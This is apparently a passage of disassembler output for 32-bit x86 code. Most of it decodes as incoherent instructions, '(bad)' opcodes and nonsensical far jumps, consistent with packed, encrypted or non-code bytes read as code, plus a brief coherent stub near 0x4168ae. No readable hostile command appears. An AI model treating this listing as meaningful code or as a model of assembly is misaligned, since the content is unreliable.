  41619f:	inc    ebx
  4161a0:	loop   0x41616f
  4161a2:	retf   0x78df
  4161a5:	in     eax,dx
  4161a6:	mov    cl,0xbb
  4161a8:	imul   ebp,DWORD PTR [edx+0x68],0x71da6b96
  4161af:	inc    ebp
  4161b0:	mov    edx,DWORD PTR [edi+0x5f]
  4161b3:	xchg   ebp,eax
  4161b4:	add    bh,ch
  4161b6:	or     ebx,DWORD PTR [ecx]
  4161b8:	in     al,0x29
  4161ba:	jns    0x4161c6
  4161bc:	inc    edi
  4161bd:	jmp    0x15863602
  4161c2:	cs pop ecx
  4161c4:	dec    ebp
  4161c5:	inc    ecx
  4161c6:	mov    ebp,0xede3918b
  4161cb:	push   es
  4161cc:	cmp    BYTE PTR [eax+0x22],dl
  4161cf:	xor    BYTE PTR [edi+0x7e],dl
  4161d2:	fisttp DWORD PTR [eax]
  4161d4:	jmp    0x4dcd476e
  4161d9:	cmp    eax,0xac1a81f1
  4161de:	jle    0x416189
  4161e0:	gs pop ds
  4161e2:	adc    eax,0xadd3415b
  4161e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161e8:	in     eax,0xc8
  4161ea:	in     al,dx
  4161eb:	xchg   edx,eax
  4161ec:	or     ah,BYTE PTR [edx+0x24]
  4161ef:	jbe    0x4161b6
  4161f1:	pop    esp
  4161f2:	mov    ebx,0x89194033
  4161f7:	mov    ebp,0xa5e94956
  4161fc:	and    BYTE PTR [edx-0x1],ch
  4161ff:	into   
  416200:	outs   dx,DWORD PTR ds:[esi]
  416201:	xor    ecx,DWORD PTR ss:[edx+0x75f9fe25]
  416208:	sar    DWORD PTR [edx+0x4ab66a50],0x35
  41620f:	fnstcw WORD PTR [eax-0x745cb8a0]
  416215:	in     eax,dx
  416216:	adc    BYTE PTR [edi-0x4cd56966],bh
  41621c:	pop    edx
  41621d:	outs   dx,DWORD PTR ds:[esi]
  41621e:	or     eax,0x37a78dbd
  416223:	das    
  416224:	adc    DWORD PTR [edx-0x22c11dfb],edi
  41622a:	add    eax,0xd5e841ef
  41622f:	data16 scas al,BYTE PTR es:[edi]
  416231:	call   0x9c13:0x22d0ec6c
  416238:	dec    edx
  416239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41623a:	sub    edi,DWORD PTR [esp+esi*2+0x76f75809]
  416241:	adc    al,0x1f
  416243:	mov    cl,0x8c
  416245:	add    bh,bh
  416247:	outs   dx,BYTE PTR ds:[esi]
  416248:	sbb    eax,0x636c72fa
  41624d:	loop   0x4161ff
  41624f:	fstp   DWORD PTR [esi+0x29bc2a96]
  416255:	mov    ds:0x3f1a12c8,al
  41625a:	scas   eax,DWORD PTR es:[edi]
  41625b:	push   ecx
  41625c:	call   0x2e9:0x946c607d
  416263:	psubq  mm4,mm2
  416266:	xor    al,0xf7
  416268:	cmp    BYTE PTR [ecx-0x6be19449],0xc9
  41626f:	retf   
  416270:	sub    BYTE PTR [ecx+0x59],cl
  416273:	cwde   
  416274:	pop    ebp
  416275:	add    al,0xec
  416277:	jecxz  0x416237
  416279:	dec    DWORD PTR [eax+ebp*8]
  41627c:	or     eax,DWORD PTR [esi-0x4dab5d89]
  416282:	adc    ch,dh
  416284:	pop    ebx
  416285:	inc    esp
  416286:	aad    0x75
  416288:	pop    esi
  416289:	push   esp
  41628a:	call   0xae6d:0x18b09a1a
  416291:	inc    edx
  416292:	shl    BYTE PTR [esi],cl
  416294:	add    ch,BYTE PTR [ebp+ebx*8-0x79]
  416298:	adc    eax,0x9518638
  41629d:	xor    DWORD PTR [esp+ecx*2+0x6d],edi
  4162a1:	sub    al,0x89
  4162a3:	push   ebx
  4162a4:	ss push 0xffffff93
  4162a7:	mov    DWORD PTR [eax-0x65477612],edi
  4162ad:	cdq    
  4162ae:	push   ebx
  4162af:	mov    cl,0x89
  4162b1:	push   0xffffff86
  4162b3:	or     al,0xf9
  4162b5:	mov    cs,WORD PTR [ebp-0x2b]
  4162b8:	mov    eax,0xc1271f91
  4162bd:	push   esi
  4162be:	inc    si
  4162c0:	idiv   cl
  4162c2:	cld    
  4162c3:	mov    edx,0x49ce19
  4162c8:	fisttp WORD PTR [ebp+0x30]
  4162cb:	shl    ah,1
  4162cd:	mov    DWORD PTR [eax-0x48],eax
  4162d0:	mov    edi,DWORD PTR [eax]
  4162d2:	xchg   esi,eax
  4162d3:	sub    ch,dh
  4162d5:	add    DWORD PTR [esp+esi*8+0x41],ecx
  4162d9:	sbb    dl,BYTE PTR [ebp-0x63]
  4162dc:	xor    al,0x1
  4162de:	add    al,0x11
  4162e0:	sar    DWORD PTR [eax+eax*1],0x5f
  4162e4:	push   ecx
  4162e5:	xor    al,0x41
  4162e7:	sbb    eax,0x1c510019
  4162ec:	push   ss
  4162ed:	out    dx,eax
  4162ee:	add    cl,BYTE PTR [edi-0x7b]
  4162f1:	jns    0x41630d
  4162f3:	(bad)  
  4162f4:	pop    ebx
  4162f5:	push   eax
  4162f6:	inc    edi
  4162f7:	outs   dx,DWORD PTR ds:[esi]
  4162f8:	or     dl,bl
  4162fa:	std    
  4162fb:	sar    DWORD PTR [edi-0x2049dfbb],0x82
  416302:	and    dh,bl
  416304:	retf   0x4883
  416307:	add    al,0xf7
  416309:	sar    DWORD PTR [esi-0x29],0x17
  41630d:	and    edi,DWORD PTR [edx+0x7e57f22f]
  416313:	cmp    eax,0xf14b290b
  416318:	js     0x416389
  41631a:	sbb    eax,0xf5b2ed6c
  41631f:	fdiv   QWORD PTR [ebx]
  416321:	rcr    DWORD PTR [ebp+0xb],cl
  416324:	imul   esp,DWORD PTR [esi],0xffffff97
  416327:	popa   
  416328:	cmc    
  416329:	dec    eax
  41632a:	or     esi,DWORD PTR [ebx-0x225c4f03]
  416330:	sub    edi,ebx
  416332:	sbb    dl,ah
  416334:	mov    ds,WORD PTR ds:0x766d710
  41633a:	bound  edx,QWORD PTR [esi-0x630f7894]
  416340:	dec    ecx
  416341:	sub    al,0x7e
  416343:	sti    
  416344:	loop   0x4162c8
  416346:	in     al,0x3
  416348:	mov    dl,0xcf
  41634a:	retf   
  41634b:	pop    edx
  41634c:	rcr    DWORD PTR [ebp+0x25],cl
  41634f:	enter  0x614c,0xff
  416353:	push   eax
  416354:	push   es
  416355:	mov    ds:0xa309aab1,eax
  41635a:	cmp    ebp,DWORD PTR [esi+0x1559f0bc]
  416360:	cmc    
  416361:	dec    esi
  416362:	imul   edx
  416364:	inc    esp
  416365:	(bad)  
  416366:	jmp    0x821c:0x4149d4ea
  41636d:	jae    0x4162f8
  41636f:	loope  0x41635a
  416371:	ret    0x60bf
  416374:	jne    0x416319
  416376:	bound  ecx,QWORD PTR [edi+0x15]
  416379:	mov    esp,0x1b8462d6
  41637e:	shr    DWORD PTR [ebp-0x10],0x8c
  416382:	xchg   DWORD PTR [esi-0x57],ecx
  416385:	mov    dh,0xb4
  416387:	dec    esi
  416388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41638a:	xor    al,0xeb
  41638c:	mov    esp,0xc89d34bf
  416391:	leave  
  416392:	out    0xd7,al
  416394:	xchg   ebx,eax
  416395:	pop    eax
  416396:	sub    dl,BYTE PTR [edx-0x7e946a93]
  41639c:	(bad)  
  41639d:	cmp    al,0xa8
  41639f:	fsubr  st(6),st
  4163a1:	ins    DWORD PTR es:[edi],dx
  4163a2:	cmova  esi,DWORD PTR [ebx-0x54]
  4163a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163a7:	pop    ecx
  4163a8:	xlat   BYTE PTR ds:[ebx]
  4163a9:	(bad)  
  4163aa:	mov    cl,0x8
  4163ac:	pop    es
  4163ad:	and    dl,BYTE PTR [eax-0x190abee0]
  4163b3:	adc    eax,0x557afea5
  4163b8:	mov    DWORD PTR [ecx-0x38e6bb1b],0x4976e280
  4163c2:	xchg   esi,eax
  4163c3:	push   edi
  4163c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163c5:	mov    edx,0xc33f6f90
  4163ca:	and    ecx,DWORD PTR [ebx-0x6208d7a8]
  4163d0:	out    0xe8,al
  4163d2:	jbe    0x4163bd
  4163d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163d5:	cmp    BYTE PTR [esi+0x7a6e687d],0xef
  4163dc:	lds    edi,FWORD PTR [ebx+0x5b6adf10]
  4163e2:	or     BYTE PTR [ebx+0x45],0x6f
  4163e6:	mov    ?,esp
  4163e8:	nop
  4163e9:	pop    edx
  4163ea:	pop    gs
  4163ec:	mov    dh,0x83
  4163ee:	shr    cl,1
  4163f0:	cld    
  4163f1:	dec    ebp
  4163f2:	cmp    BYTE PTR [eax],cl
  4163f4:	jno    0x41645e
  4163f6:	repnz test BYTE PTR [esi+0x66158129],ah
  4163fd:	xor    cl,0xae
  416400:	leave  
  416401:	dec    edi
  416402:	mov    fs,WORD PTR [ecx+0x26abc529]
  416408:	pop    ss
  416409:	(bad)  
  41640a:	in     al,dx
  41640b:	scas   eax,DWORD PTR es:[edi]
  41640c:	inc    ebx
  41640d:	scas   eax,DWORD PTR es:[edi]
  41640e:	add    BYTE PTR [eax-0x5a],dh
  416411:	(bad)  
  416413:	jo     0x4163bd
  416415:	(bad)  
  416416:	retf   0xa5c8
  416419:	arpl   si,di
  41641b:	and    ecx,DWORD PTR ss:[edi-0x21]
  41641f:	push   ebp
  416420:	or     dh,ah
  416422:	call   0xc1dc9274
  416427:	int    0x2f
  416429:	push   0x75
  41642b:	stos   DWORD PTR es:[edi],eax
  41642c:	add    BYTE PTR [edx+0x46203aa4],ch
  416432:	ja     0x4163f2
  416434:	xchg   esp,eax
  416435:	lahf   
  416436:	jecxz  0x416423
  416438:	ins    BYTE PTR es:[edi],dx
  416439:	pop    es
  41643a:	retf   
  41643b:	pushf  
  41643c:	xchg   ebp,eax
  41643e:	ins    BYTE PTR es:[edi],dx
  41643f:	jne    0x4164b5
  416441:	adc    eax,0x49d29261
  416446:	sahf   
  416447:	mov    ds:0xb4db062b,al
  41644c:	lock jp 0x4163ef
  41644f:	dec    eax
  416450:	pop    ss
  416451:	or     ah,dh
  416453:	push   ebx
  416454:	arpl   WORD PTR [edi],sp
  416456:	pop    ebp
  416457:	daa    
  416458:	call   0xa0b1:0xe0af28bc
  41645f:	add    BYTE PTR [ecx-0x28],cl
  416462:	mov    ebx,0x3b16e06e
  416467:	xor    al,0x60
  416469:	test   eax,0x5bf7fd1e
  41646e:	dec    edi
  41646f:	call   0xed868861
  416474:	jl     0x41646d
  416476:	jno    0x416462
  416478:	mov    dl,BYTE PTR [edx]
  41647a:	test   DWORD PTR [ebx-0x258d430d],ebp
  416480:	inc    BYTE PTR [ebx-0x50]
  416483:	add    al,0xe5
  416485:	lds    edx,FWORD PTR [edi+0x6a]
  416488:	call   0x8360:0xbbf5195f
  41648f:	retf   
  416490:	int    0x4
  416492:	aas    
  416493:	inc    edi
  416494:	aad    0xe8
  416496:	inc    ecx
  416497:	pop    esi
  416498:	sub    al,0x44
  41649a:	xor    ah,al
  41649c:	bound  esp,QWORD PTR [ebp+0x38]
  41649f:	xor    ecx,DWORD PTR [ebx+0x2ec7a06a]
  4164a5:	inc    eax
  4164a6:	cld    
  4164a7:	stos   BYTE PTR es:[edi],al
  4164a8:	mov    bl,0xb5
  4164aa:	adc    BYTE PTR [ebp+0xd],dl
  4164ad:	cmp    DWORD PTR [eax-0x6b],esi
  4164b0:	sub    cl,BYTE PTR [esi]
  4164b2:	mov    ebx,esi
  4164b4:	leave  
  4164b5:	scas   al,BYTE PTR es:[edi]
  4164b6:	sub    al,0x45
  4164b8:	ret    0x8d62
  4164bb:	xor    al,0x6
  4164bd:	std    
  4164be:	(bad)  
  4164bf:	cmc    
  4164c0:	enter  0x31c,0x86
  4164c4:	xchg   DWORD PTR [eax-0x44565d8c],esp
  4164ca:	inc    ecx
  4164cb:	push   edi
  4164cc:	mov    ds:0x41d2a7f1,al
  4164d1:	in     al,dx
  4164d2:	ja     0x416493
  4164d4:	lods   eax,DWORD PTR ds:[esi]
  4164d5:	xchg   ch,cl
  4164d7:	into   
  4164d8:	sahf   
  4164d9:	lods   eax,DWORD PTR ds:[esi]
  4164da:	rcr    BYTE PTR [ebx],0x57
  4164dd:	popf   
  4164de:	push   eax
  4164df:	cs jmp 0x4164c2
  4164e2:	(bad)  
  4164e3:	ficom  WORD PTR [ebx]
  4164e5:	push   ebx
  4164e6:	jmp    0x416506
  4164e8:	sbb    BYTE PTR cs:[ecx],dh
  4164eb:	add    ah,BYTE PTR fs:[ecx+esi*4]
  4164ef:	fs inc esi
  4164f1:	xchg   BYTE PTR [edi+ecx*2+0x7f],bh
  4164f5:	outs   dx,DWORD PTR ds:[esi]
  4164f6:	dec    ebx
  4164f7:	dec    ecx
  4164f8:	push   esi
  4164f9:	cs test eax,0x4c99c10b
  4164ff:	jl     0x416484
  416501:	call   0xd1d:0x7f788c37
  416508:	adc    al,0xb5
  41650a:	aam    0x44
  41650c:	out    dx,eax
  41650d:	fmul   QWORD PTR [eax]
  41650f:	dec    esp
  416510:	adc    BYTE PTR [esi],0xc
  416513:	push   es
  416514:	aad    0x1c
  416516:	jnp    0x416546
  416518:	ror    BYTE PTR [eax-0x19a66664],1
  41651e:	sub    ch,dl
  416520:	mov    dl,0x77
  416522:	mov    eax,DWORD PTR [ebx+eiz*2+0x22]
  416526:	mov    ch,BYTE PTR [edi-0x51fe2c6f]
  41652c:	xor    BYTE PTR [esi],0x14
  41652f:	inc    BYTE PTR [ebx-0x49ea029f]
  416535:	hlt    
  416536:	dec    ecx
  416537:	mov    dl,0x71
  416539:	ss ins DWORD PTR es:[edi],dx
  41653b:	xor    BYTE PTR [edx],bl
  41653d:	and    eax,0xc3e50e24
  416542:	arpl   dx,bx
  416544:	ds or  al,0xe7
  416547:	aas    
  416548:	push   es
  416549:	mov    ah,0xf9
  41654b:	in     al,dx
  41654c:	mov    ebx,0xed0e40cf
  416551:	mov    BYTE PTR [esi+ebp*2-0xf],ch
  416555:	dec    ebp
  416556:	add    eax,0xc62123cd
  41655b:	jmp    0x4165d1
  41655d:	sub    edx,DWORD PTR [eax+edx*8+0x3f]
  416561:	(bad)  
  416562:	call   0x5ae065e3
  416567:	add    cl,cl
  416569:	xchg   ebp,eax
  41656a:	sbb    eax,0xd6b82c5f
  41656f:	jnp    0x4164fe
  416571:	dec    esi
  416572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416573:	or     eax,0x6ca1979c
  416578:	pop    ecx
  416579:	je     0x4165e7
  41657b:	mov    ah,0x36
  41657d:	push   ebp
  41657e:	(bad)  
  41657f:	and    BYTE PTR [eax-0x494705c3],cl
  416585:	ret    0xf355
  416588:	es xchg ecx,eax
  41658a:	stos   DWORD PTR es:[edi],eax
  41658b:	xor    al,0x18
  41658d:	mov    DWORD PTR [eax],edx
  41658f:	cli    
  416590:	pop    esp
  416591:	mov    bl,0x2d
  416593:	jge    0x4165fd
  416595:	dec    ecx
  416596:	inc    esp
  416597:	mov    WORD PTR [ebx-0x635ea06d],es
  41659d:	jl     0x416583
  41659f:	xchg   ecx,eax
  4165a0:	mov    edx,0x3786f90a
  4165a5:	mov    al,0x91
  4165a7:	jmp    0xc1ccc3fb
  4165ac:	aaa    
  4165ad:	pop    ebp
  4165ae:	sub    al,dh
  4165b0:	cli    
  4165b1:	mul    esp
  4165b3:	ins    DWORD PTR es:[edi],dx
  4165b4:	pop    es
  4165b5:	enter  0x3bdf,0x2e
  4165b9:	in     al,0x6a
  4165bb:	clc    
  4165bc:	int    0x8b
  4165be:	ret    0x1a1c
  4165c1:	add    BYTE PTR [esi-0x48893c4b],cl
  4165c7:	xchg   esp,eax
  4165c8:	ret    
  4165c9:	push   ds
  4165ca:	push   ebp
  4165cb:	sub    cl,ch
  4165cd:	adc    BYTE PTR [ecx],bl
  4165cf:	mov    al,0x65
  4165d1:	in     ax,dx
  4165d3:	lods   al,BYTE PTR ds:[esi]
  4165d4:	xor    esi,DWORD PTR [edi+0x3d276530]
  4165da:	into   
  4165db:	and    cl,ah
  4165dd:	mov    al,ds:0x308eff6d
  4165e2:	sub    dh,BYTE PTR [eax]
  4165e4:	mov    bl,0x21
  4165e6:	into   
  4165e7:	push   edx
  4165e8:	sub    BYTE PTR [edx-0x6f9c62be],cl
  4165ee:	int    0x88
  4165f0:	jmp    0x3d18:0xe353f0cf
  4165f7:	clc    
  4165f8:	sbb    BYTE PTR [edx],dl
  4165fa:	xlat   BYTE PTR ds:[ebx]
  4165fb:	and    ah,ah
  4165fd:	stc    
  4165fe:	dec    edx
  4165ff:	(bad)  
  416602:	jae    0x416606
  416604:	mov    al,ds:0x338ef206
  416609:	cld    
  41660a:	inc    esi
  41660b:	call   0x4f95:0x3e166f90
  416612:	std    
  416613:	lea    esi,ss:[ecx-0x53]
  416617:	inc    esi
  416618:	ror    BYTE PTR [eax+0x20a60794],1
  41661e:	loope  0x4165e9
  416620:	(bad)  
  416621:	idiv   DWORD PTR [eax+ebx*8+0x27e712c4]
  416628:	in     al,dx
  416629:	inc    eax
  41662a:	pop    ss
  41662b:	mov    esp,0xfd180bd7
  416630:	loopne 0x4166a3
  416632:	mov    esp,0x6ea38f83
  416637:	jmp    0x4165d9
  416639:	retf   
  41663a:	daa    
  41663b:	adc    eax,0xe52e3823
  416640:	div    BYTE PTR [ebx+eax*1+0x4392f5b0]
  416647:	aas    
  416648:	adc    DWORD PTR [esi-0x45],ebp
  41664b:	(bad)  
  41664c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41664d:	dec    edi
  41664e:	mov    ah,0x86
  416650:	add    al,0xdd
  416652:	sub    al,0x87
  416654:	pop    ecx
  416655:	ds pop ds
  416657:	in     eax,dx
  416658:	retf   0x56b4
  41665b:	or     BYTE PTR [ebp-0x790684d2],dl
  416661:	jae    0x41663e
  416663:	mov    al,ds:0x8ed34f89
  416668:	xor    BYTE PTR [edx-0x3a],0x19
  41666c:	stos   DWORD PTR es:[edi],eax
  41666d:	sub    ch,BYTE PTR [ebp+0x36]
  416670:	xchg   edi,eax
  416671:	mov    ch,0xeb
  416673:	dec    edi
  416674:	pop    ebx
  416675:	jmp    0xc42a:0x34b4ca74
  41667c:	add    ah,BYTE PTR [ebp+esi*1-0x43]
  416680:	sbb    al,0x55
  416682:	adc    al,0x3
  416684:	leave  
  416685:	pop    es
  416686:	jl     0x416676
  416688:	cmp    DWORD PTR [ecx-0x53],ebp
  41668b:	or     al,0x65
  41668d:	sbb    eax,0xffffffc1
  416690:	mov    cl,0x3a
  416692:	mov    dh,0xc
  416694:	loope  0x416644
  416696:	jne    0x416675
  416698:	int3   
  416699:	test   DWORD PTR [eax+edx*2],0xddb8f704
  4166a0:	pusha  
  4166a1:	imul   bh
  4166a3:	stos   DWORD PTR es:[edi],eax
  4166a4:	sbb    esi,DWORD PTR [edi-0x49b95e9e]
  4166aa:	ja     0x4166f7
  4166ac:	jb     0x41665c
  4166ae:	div    DWORD PTR [ebx]
  4166b0:	inc    ebp
  4166b1:	adc    dh,BYTE PTR [edx+0x40]
  4166b4:	jae    0x4166fa
  4166b6:	lods   al,BYTE PTR ds:[esi]
  4166b7:	fs and edi,edx
  4166ba:	ins    DWORD PTR es:[edi],dx
  4166bb:	dec    eax
  4166bc:	stos   BYTE PTR es:[edi],al
  4166bd:	mov    ds:0x6270190d,al
  4166c2:	test   bl,ah
  4166c4:	ss push esp
  4166c6:	popa   
  4166c7:	or     edi,DWORD PTR [edx-0x5f15cf82]
  4166cd:	stos   BYTE PTR es:[edi],al
  4166ce:	xor    eax,0x1ca13ad0
  4166d3:	add    ecx,DWORD PTR [ebx-0x20a10e65]
  4166d9:	mov    esp,0x2d2509d4
  4166de:	sbb    dl,BYTE PTR [edi+eiz*2-0x30]
  4166e2:	pushf  
  4166e3:	pushf  
  4166e4:	mov    dh,0x8b
  4166e6:	mov    dh,0x19
  4166e8:	cmp    DWORD PTR [ebp*1+0x4c297b52],ecx
  4166ef:	pop    edi
  4166f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166f1:	inc    esi
  4166f2:	fcmovne st,st(4)
  4166f4:	aam    0x8f
  4166f6:	sub    BYTE PTR [ebx-0x53],dh
  4166f9:	jmp    0x7799:0xc6b606ef
  416700:	xor    DWORD PTR [esi-0x5f],ebp
  416703:	push   edi
  416704:	xor    al,0xff
  416707:	fmul   DWORD PTR [eax+0x1479989e]
  41670d:	cli    
  41670e:	int3   
  41670f:	loop   0x4166d3
  416711:	xchg   BYTE PTR [ecx],dl
  416713:	into   
  416714:	pop    esp
  416715:	cli    
  416716:	fcom   st(6)
  416718:	add    dl,0x66
  41671b:	mov    ecx,0x728859af
  416720:	cmp    DWORD PTR [ebx-0x4f],ebx
  416723:	pop    ebp
  416724:	data16 aad 0xb8
  416727:	mov    ds:0x765de3c2,eax
  41672c:	add    eax,0x30617ee4
  416731:	arpl   WORD PTR cs:[eax+0x193eefcf],bx
  416738:	pop    edi
  416739:	pop    ebp
  41673a:	mov    bl,0x90
  41673c:	mov    cl,0x58
  41673e:	mov    BYTE PTR [esi],bl
  416740:	je     0x416763
  416742:	pop    edx
  416743:	add    eax,0x1897b0c0
  416748:	xchg   ecx,eax
  416749:	das    
  41674a:	lods   al,BYTE PTR ds:[esi]
  41674b:	ja     0x41673f
  41674d:	or     dl,BYTE PTR [ecx+0x11c30a1e]
  416753:	mov    al,ds:0xdbed4281
  416758:	jbe    0x416707
  41675a:	je     0x4167c8
  41675c:	xchg   esp,eax
  41675d:	daa    
  41675e:	jg     0x4167d6
  416760:	hlt    
  416761:	jno    0x416771
  416763:	push   0xfffffff9
  416765:	jbe    0x4166f7
  416767:	mov    edx,0xd4d11f6a
  41676c:	pop    ebp
  41676d:	mov    DWORD PTR [ebx-0x26],ecx
  416770:	jp     0x416728
  416772:	adc    al,0xd7
  416774:	icebp  
  416775:	test   esp,eax
  416777:	adc    al,0xa6
  416779:	pop    es
  41677a:	hlt    
  41677b:	rol    dh,cl
  41677d:	mov    ebp,0x9570b012
  416782:	and    BYTE PTR [ebp+0x56674b4],dl
  416788:	pop    edi
  416789:	mov    esi,0x50c4c06c
  41678e:	adc    al,0xe8
  416790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416791:	jnp    0x41675c
  416793:	xor    dl,BYTE PTR [edi+esi*2+0x749a2c3f]
  41679a:	fistp  QWORD PTR [edi+0x19f02f8d]
  4167a0:	int3   
  4167a1:	jnp    0x4167e9
  4167a3:	sbb    eax,DWORD PTR ds:0xcd93ec0a
  4167a9:	add    al,bh
  4167ab:	out    dx,eax
  4167ac:	call   0x5a3d:0xd097867f
  4167b3:	cmp    esp,DWORD PTR cs:[ecx-0x518e7c88]
  4167ba:	sbb    BYTE PTR [esp+edi*4-0x71],ch
  4167be:	pop    ds
  4167bf:	ins    DWORD PTR es:[edi],dx
  4167c0:	ds mov esi,0x438bb1ee
  4167c6:	jns    0x4167e3
  4167c8:	xchg   esp,eax
  4167c9:	or     BYTE PTR [edi+edi*2-0x43ea7c99],bh
  4167d0:	arpl   WORD PTR [ecx-0x27],si
  4167d3:	push   0x14d04f60
  4167d8:	mov    ah,al
  4167da:	ficom  DWORD PTR es:[ecx-0xd]
  4167de:	dec    ebx
  4167df:	popa   
  4167e0:	div    DWORD PTR [esi]
  4167e2:	sbb    BYTE PTR [ecx],dl
  4167e4:	ins    DWORD PTR es:[edi],dx
  4167e5:	xor    eax,0x43911349
  4167ea:	shr    eax,0xdf
  4167ed:	outs   dx,DWORD PTR ds:[esi]
  4167ee:	pop    esp
  4167ef:	xlat   BYTE PTR ds:[ebx]
  4167f0:	add    eax,0xf6497a66
  4167f5:	ret    0xd28
  4167f8:	in     al,dx
  4167f9:	loope  0x416795
  4167fb:	ret    
  4167fc:	(bad)  
  4167fd:	ds mov edx,0xa07bbabb
  416803:	pop    edx
  416804:	mov    ah,0x97
  416806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416807:	push   esp
  416808:	std    
  416809:	imul   esi,edi,0x52
  41680c:	retf   0xfe24
  41680f:	xchg   DWORD PTR [ecx],eax
  416811:	call   0x881:0x793a2a83
  416818:	repz test eax,0xce5dde02
  41681e:	fbstp  TBYTE PTR [ebx+edi*2]
  416821:	sub    edx,ebp
  416823:	jne    0x416872
  416825:	add    al,0x51
  416827:	adc    DWORD PTR [edi-0x2acbbf35],edi
  41682d:	mov    ebx,0xb5d6bfb8
  416832:	pop    ebx
  416833:	div    ch
  416835:	mov    WORD PTR [edi-0xb],gs
  416838:	inc    esp
  416839:	fbstp  TBYTE PTR ss:[edx]
  41683c:	dec    DWORD PTR [edi-0x47c1514a]
  416842:	test   DWORD PTR [ecx],ebp
  416844:	shr    bh,0x49
  416847:	mov    BYTE PTR [ecx+0x5520642a],dl
  41684d:	pop    esp
  41684e:	dec    esi
  41684f:	xchg   ebx,eax
  416850:	mov    ?,WORD PTR [edx+0x75]
  416853:	push   eax
  416854:	inc    ecx
  416855:	imul   esp,DWORD PTR [eax],0x26
  416858:	into   
  416859:	and    ebp,DWORD PTR [ebx+edi*8+0x19]
  41685d:	aas    
  41685e:	into   
  41685f:	sub    eax,0xe779da4f
  416864:	jge    0x4168e0
  416866:	cmp    eax,0xa56dc53b
  41686b:	sbb    eax,edx
  41686d:	test   BYTE PTR [edx],bl
  41686f:	in     eax,dx
  416870:	sti    
  416871:	sub    BYTE PTR fs:[esi+0x59ef4f97],dh
  416878:	xlat   BYTE PTR ds:[ebx]
  416879:	mov    ebx,0x191b4c6f
  41687e:	nop
  41687f:	or     BYTE PTR [ebx-0x6b],al
  416882:	inc    eax
  416883:	ja     0x4168a7
  416885:	or     BYTE PTR [edx+0x69b4bd13],bh
  41688b:	mov    al,0xd5
  41688d:	pop    es
  41688e:	jg     0x416863
  416890:	lahf   
  416891:	fadd   QWORD PTR [ebp+0x15426163]
  416897:	sar    DWORD PTR [esi],cl
  416899:	push   cs
  41689a:	mov    BYTE PTR [esi+0x51],al
  41689d:	loope  0x4168ae
  41689f:	xchg   edi,eax
  4168a0:	lds    eax,FWORD PTR [ecx+0x55e13972]
  4168a6:	lods   eax,DWORD PTR ds:[esi]
  4168a7:	into   
  4168a8:	rol    DWORD PTR [ebp+0x5eea5067],cl
  4168ae:	mov    DWORD PTR [ebp-0x58],edx
  4168b1:	mov    edx,DWORD PTR [ebp+0x8]
  4168b4:	mov    ebx,DWORD PTR [ebp-0x54]
  4168b7:	add    edx,0x64f893
  4168bd:	or     edx,ebx
  4168bf:	mov    DWORD PTR [ebp-0x54],edx
  4168c2:	mov    edx,DWORD PTR [ebp+0x8]
  4168c5:	jmp    0x418c66
  4168ca:	push   edi
  4168cb:	gs stos DWORD PTR es:[edi],eax
  4168cd:	cwde   
  4168ce:	jnp    0x416868
  4168d0:	inc    edi
  4168d1:	jns    0x4168fa
  4168d3:	in     eax,dx
  4168d4:	fistp  DWORD PTR [eax-0x10]
  4168d7:	clc    
  4168d8:	scas   al,BYTE PTR es:[edi]
  4168d9:	std    
  4168da:	mov    esi,0xfe7a7d3b
  4168df:	pop    edi
  4168e0:	jp     0x41695c
  4168e2:	dec    esp
  4168e3:	addr16 int 0xd5
  4168e6:	sbb    eax,0xf274fc1a
  4168eb:	jmp    0xeec3fa9a
  4168f0:	add    al,0x10
  4168f2:	sbb    ch,BYTE PTR [edi-0x67]
  4168f5:	aaa    
  4168f6:	popf   
  4168f7:	mov    dh,0xcb
  4168f9:	mov    edi,0x9495f93e
  4168fe:	add    al,0x1f
  416900:	adc    dl,BYTE PTR [ecx+edx*4-0x266b9549]
  416907:	push   ss
  416908:	cld    
  416909:	std    
  41690a:	inc    esi
  41690b:	sbb    eax,0xaa6f4571
  416910:	lea    ebx,[ecx+esi*1]
  416913:	dec    ecx
  416914:	test   DWORD PTR [ecx],0x28e1b7a7
  41691a:	cmp    DWORD PTR [ebx-0x4468d0da],ecx
  416920:	push   cs
  416921:	ret    
  416922:	inc    ecx
  416923:	iret   
  416924:	dec    esp
  416925:	in     al,dx
  416926:	ja     0x416926
  416928:	mov    ds:0xe3fb1792,al
  41692d:	cmp    eax,0x8068ceb
  416932:	outs   dx,BYTE PTR es:[esi]
  416934:	out    dx,al
  416935:	push   ds
  416936:	jl     0x4168c0
  416938:	mov    ch,0xdb
  41693a:	stos   DWORD PTR es:[edi],eax
  41693b:	clc    
  41693c:	iret   
  41693d:	ret    0x207d
  416940:	mov    ds:0xbb3697d4,eax
  416945:	push   edx
  416946:	pop    eax
  416947:	mov    bh,0x8
  416949:	in     al,dx
  41694a:	in     eax,dx
  41694b:	add    DWORD PTR [esp+eiz*4-0x6a8f2c7c],esi
  416952:	add    al,0x22
  416954:	xor    dl,BYTE PTR [eax]
  416956:	and    DWORD PTR [edi],0xf89c538c
  41695c:	sbb    ah,BYTE PTR [ebp+ebx*4+0x69e95f93]
  416963:	or     eax,0x3ed0c3cf
  416968:	dec    ecx
  416969:	bound  esi,QWORD PTR [edx+ecx*1+0xa904d5b]
  416970:	repz xor BYTE PTR [ebx],bh
  416973:	mov    bl,0xa2
  416975:	dec    esp
  416976:	aam    0x1
  416978:	mov    esp,0x19ff1f4f
  41697d:	add    edx,DWORD PTR [eax-0x51b6c41c]
  416983:	shr    BYTE PTR [esi],1
  416985:	jnp    0x41692c
  416987:	push   esi
  416988:	(bad)  
  416989:	arpl   WORD PTR [ecx],sp
  41698b:	loope  0x4169d0
  41698d:	fwait
  41698e:	scas   eax,DWORD PTR es:[edi]
  41698f:	mov    esp,0xa92a4c26
  416994:	sti    
  416995:	pop    edi
  416996:	dec    ebp
  416997:	jle    0x416a08
